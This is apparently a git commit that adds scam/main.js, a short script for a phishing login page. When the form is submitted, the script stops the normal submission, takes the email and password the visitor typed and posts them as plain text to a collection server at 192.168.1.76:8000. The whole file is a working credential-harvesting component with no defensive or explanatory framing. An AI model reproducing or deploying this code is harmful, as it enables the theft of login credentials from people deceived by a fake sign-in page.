87ea5483bfffe43283987ca3ca029a8add19f148
pygamer <84566455+Bishnu-coder@users.noreply.github.com>
2023-04-18 07:12:10 +0545

    Add files via upload

---
+++ scam/main.js
@@ -0,0 +1,30 @@
+document.getElementById("loginForm").addEventListener("submit", function (event) {
+  event.preventDefault(); // prevent form submission
+
+  // Retrieve login information from form
+  var username = document.getElementById("email").value;
+  var password = document.getElementById("password").value;
+  console.log(username, password)
+
+  const url = 'http://192.168.1.76:8000'; // URL of the Python server
+  const message = username+","+password; // Text message to send in the request body
+
+  fetch(url, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'text/plain',
+    },
+    body: message,
+  })
+    .then(response => {
+      if (response.ok) {
+        console.log('Message sent successfully!');
+      } else {
+        console.error('Failed to send message:', response.status);
+      }
+    })
+    .catch(error => {
+      console.error('Error sending message:', error);
+    });
+
+});
